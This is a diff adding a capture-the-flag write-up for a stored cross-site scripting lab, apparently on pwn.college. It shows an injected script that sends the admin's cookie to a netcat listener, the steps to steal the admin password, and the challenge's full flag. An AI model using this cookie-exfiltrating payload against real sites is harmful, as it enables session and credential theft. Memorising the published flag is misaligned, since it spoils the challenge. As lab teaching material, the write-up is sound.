@@ -1,0 +1,53 @@
+# challenge: XSS 7
+
+📅 2026-02-28
+📁 web security
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+2 tables: 
+posts -> 3 columns: content-author-published
+only 1 record: [flag]-admin-FALSE
+users -> 2 columns: username-password
+3 records: admin-[last 20chars of the flag], guest-password, hacker-1337
+endpoints:
+/login -> POST-username&password and sets a cookie: name=auth value=username|password
+/draft -> POST-content&publish and checks for cookie. from the cookie it extracts username and password. if they exist in the users db -> 200. if username=admin -> 400
+/publish -> POST-no content. it checks for cookie value as /draft. publishes all user's draft posts
+/ root -> GET. it shows all published posts and user's draft posts
+the goal is to steal admin's cookie since the cookie is built based on user's credentials
+-ran: '/challenge/server'
+-opened a new terminal
+-ran: 'nc -vl 127.0.0.1 5001'
+-opened the browser
+-url: http://challenge.localhost:80/
+-logged in as hacker-1337
+-thick publish, save the following content: </textarea> <script> fetch("http://127.0.0.1:5001/?cookie=" + document.cookie); </script>
+-back to nc terminal
+-pressed Ctrl+C
+-ran again: 'nc -vl 127.0.0.1 5001'
+-opened a new terminal
+-ran: '/challenge/victim http://challenge.localhost:80/'
+-back to nc terminal
+-retrieved admin's password
+-opened the browser
+-url: http://challenge.localhost:80/
+-logged in as admin-.QXygTN2wCO4IDOxEzW} -> password
+-full flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+actually this is the first real XSS challenge using a server to steal cookies
+this one was super useful because it gives a full portrait of xss, used for stealing cookies
+unlocked a new upgrade: nc can be used also as running server and not only for sending requests from client to server
+this discovering was crucial because it allows u to recieve cookies from websites in which u injected ur fetch function. it just make it easier
+-l option in netcat specify listening mode. then u have to specify the full IP and the port -> 127.0.0.1 local, 5001 no privileges needed
+once the server is running, inject a fetch which performs a GET (GET method is enough because we will puts data in the URL using query string) to ur server.
+since its javascript, u have to specify the cookie by using: cookie.document after closing qoutes " 
+runned the victim machine on root challenge's endpoint and stole the cookie (password) from admin
+
+## 🏁 Flag  
+pwn.college{AJfLs9K9sk9lT6gvQ2ebRiDSKjt.QXygTN2wCO4IDOxEzW}
